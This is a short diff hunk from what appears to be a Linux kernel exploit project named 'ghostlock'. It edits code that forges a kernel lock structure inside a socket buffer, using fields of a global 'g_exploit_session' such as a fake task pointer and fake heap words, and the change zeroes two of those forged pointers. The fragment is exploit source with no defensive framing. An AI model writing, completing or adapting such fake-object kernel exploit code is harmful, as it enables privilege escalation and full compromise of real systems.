@@ -379,8 +379,8 @@ namespace ghostlock::support {
             unsigned char *p = skb_buf() + chunk + chunk_bias;
 
             put32(p, kernel::LOCK_OFF + 0x00, 0);
-            put64(p, kernel::LOCK_OFF + 0x08, (session::g_exploit_session.heap.current.fake_w0));
-            put64(p, kernel::LOCK_OFF + 0x10, (session::g_exploit_session.heap.current.fake_w0));
+            put64(p, kernel::LOCK_OFF + 0x08, 0);
+            put64(p, kernel::LOCK_OFF + 0x10, 0);
             put64(p, kernel::LOCK_OFF + 0x18, (session::g_exploit_session.heap.current.fake_task) | 1);
 
             if (compact) {
